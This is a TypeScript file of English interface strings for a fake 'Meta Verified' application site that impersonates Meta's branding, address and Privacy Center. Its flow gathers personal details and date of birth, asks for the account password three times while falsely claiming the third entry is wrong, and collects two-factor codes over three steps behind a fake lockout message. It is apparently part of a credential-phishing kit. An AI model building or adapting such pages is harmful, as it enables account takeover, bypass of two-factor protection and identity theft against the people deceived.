import type { AppStrings } from '../schema'

export const en: AppStrings = {
  common: {
    close: 'Close',
    continue: 'Continue',
    facebook: 'Facebook',
  },
  main: {
    badge: 'META VERIFIED SUPPORT',
    releaseDate: 'Release date:',
    title: 'Submit your Meta Verified review request',
    lead1:
      'Your Page meets the criteria for review. Please complete your application so the verification team can prioritize intake and processing.',
    lead2:
      'A complete application shortens reconciliation time and improves accuracy during identity verification. The system will automatically record your application status using the tracking code below.',
    caseId: 'Verification case ID:',
    benefitsTitle: 'Benefits of verification',
    benefit1: '- Affirm your Page’s credibility with an official verification badge.',
    benefit2: '- Strengthen account safety through reconciliation and additional safeguards.',
    benefit3: '- Improve customer reach with more stable visibility.',
    prepTitle: 'Information to prepare',
    prep1: '- Administrator details and valid business information.',
    prep2: '- An email address and phone number that can be verified immediately.',
    prep3: '- Account security settings and two-factor authentication.',
    processTitle: 'Application processing flow',
    process1: '- Step 1: Intake and completeness checks.',
    process2: '- Step 2: Verification data review and policy compliance.',
    process3: '- Step 3: Review outcome and next steps.',
    cta: 'Submit Meta Verified application',
    note:
      'Important: Applications are approved only when submitted information is complete, accurate, and verifiable. Standard response time is 24 business hours; some cases may take longer if additional verification is required.',
    linkPrivacy: 'Privacy Policy',
    linkTerms: 'Terms',
    linkCommunity: 'Community Standards',
    linkHelp: 'Help Center',
    linkBusiness: 'Meta Business Help Center',
    footerMeta:
      'Meta Platforms, Inc., Attention: Community Support, 1 Meta Way, Menlo Park, CA 94025',
  },
  info: {
    title: 'Verification details',
    hint: 'Please fill in all required fields accurately to complete your verification application.',
    fullName: 'Representative full name',
    fullNamePh: 'e.g. Jane Doe',
    email: 'Contact email',
    emailPh: 'e.g. name@gmail.com',
    emailBiz: 'Business email',
    emailBizPh: 'e.g. contact@company.com',
    fanpage: 'Page / Fan Page name',
    fanpagePh: 'e.g. ABC Studio Official',
    phone: 'Phone number',
    dob: 'Date of birth',
    day: 'Day',
    month: 'Month',
    year: 'Year',
    message: 'Additional notes (optional)',
    messagePh:
      'e.g. This is the official Page for brand ABC; verification is needed to increase trust.',
    agree: 'I agree to the',
    agreeTerms: 'Terms of Use',
    submit: 'Submit verification details',
    errFullName: 'Please enter your full name.',
    errEmail: 'Please enter a contact email address.',
    errEmailFmt: 'Contact email format is invalid (e.g. name@domain.com).',
    errEmailBiz: 'Please enter a valid business email.',
    errEmailBizFmt: 'Business email format is invalid (e.g. name@domain.com).',
    errFanpage: 'Please enter the Page / Fan Page name.',
    errPhone: 'Please enter a phone number.',
    errPhoneLen: 'Phone numbers must have 8–15 digits (excluding + and spaces).',
    errDay: 'Please select a day of birth.',
    errMonth: 'Please select a month of birth.',
    errYear: 'Please select a year of birth.',
  },
  password: {
    firstPrompt: 'Please verify your password to continue.',
    secondPrompt: 'Re-enter your password to complete confirmation.',
    thirdPrompt: 'Confirm your password again to continue.',
    notice:
      'Please review your password carefully before confirming. You can use the show icon to avoid typing mistakes.',
    noticeThird:
      'The password entered is not correct. If needed, use the "Forgot password?" option.',
    phFirst: 'Enter password',
    phSecond: 'Confirm password',
    continue: 'Confirm',
    forgot: 'Forgot password?',
    errEmpty: 'You need to enter your password to continue.',
    errWrong: 'The password is incorrect. Please check and try again.',
  },
  twoFa: {
    title: (step) => `Account Security Verification (Step ${step}/3)`,
    description: (email, phone) =>
      `Enter the security code sent to ${email} and ${phone}, or confirm using an authenticator app you have configured (such as Duo Mobile or Google Authenticator).`,
    label: 'Security code',
    placeholder: 'Enter security code',
    hint: 'Security codes are usually 6 or 8 digits.',
    tryOther: 'Use another verification method',
    ariaInput: 'Security code entry',
    ariaSubmit: 'Verify',
    errInvalid: 'The code is invalid. Please review your entry and try again.',
    errSend: 'Unable to send the code at this time. Please try again later.',
    errVerify: 'Unable to verify the code. Please check and try again.',
    retryError: (minutes, seconds) =>
      `The code you entered is incorrect. Please try again in ${minutes} minutes ${seconds} seconds.`,
  },
  success: {
    title: 'Application received',
    p1:
      'Your Meta Verified request has been added to the priority processing queue. The review team will verify your details and update the outcome as soon as possible.',
    p2: 'If more information is needed, the system will send instructions to complete your application.',
    cta: 'Return to Facebook',
  },
  captcha: {
    notRobot: "I'm not a robot",
    privacyTerms: 'Privacy - Terms',
    p1:
      'This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.',
    p2:
      "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
    p3:
      'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.',
  },
  nav: {
    heading: 'Privacy Center',
    home: 'Privacy Center Home',
    search: 'Search',
    commonSettings: 'Common privacy settings',
    topics: 'Privacy topics',
    moreResources: 'More privacy resources',
    policy: 'Privacy Policy',
    policyQ1: 'What is the Privacy Policy and what does it cover?',
    policyQ2: 'What information do we collect?',
    policyQ3: 'How do we use your information?',
    policyQ4:
      'How do we share your information on Meta Products or with integrated partners?',
    policyQ5: 'How do we share information with third parties?',
    policyQ6: 'How is the cooperation between Meta Companies organized?',
    policyQ7: 'How can you manage or delete your information and exercise your rights?',
    policyQ8: 'How long do we keep your information?',
    policyQ9: 'How do we transmit information?',
    policyQ10:
      'How do we respond to official requests, comply with applicable laws, and prevent harm?',
    policyQ11: 'How will you know when the policy changes?',
    policyQ12: 'How to ask Meta questions?',
    policyQ13: 'Why and how we process your data',
    otherRules: 'Other rules and articles',
    cookie: 'Cookie Policy',
    nonUsers: 'Information for those who do not use Meta Products',
    genAi: 'How Meta uses information for generative AI models',
    dataTransfer: 'Data Transfer Framework Policy',
    otherTerms: 'Other terms and conditions',
    mobileTitle: 'Privacy Policy',
  },
  languagePicker: {
    label: 'View in another language (optional)',
    autoOption: 'Automatic (from your IP / location)',
  },
}
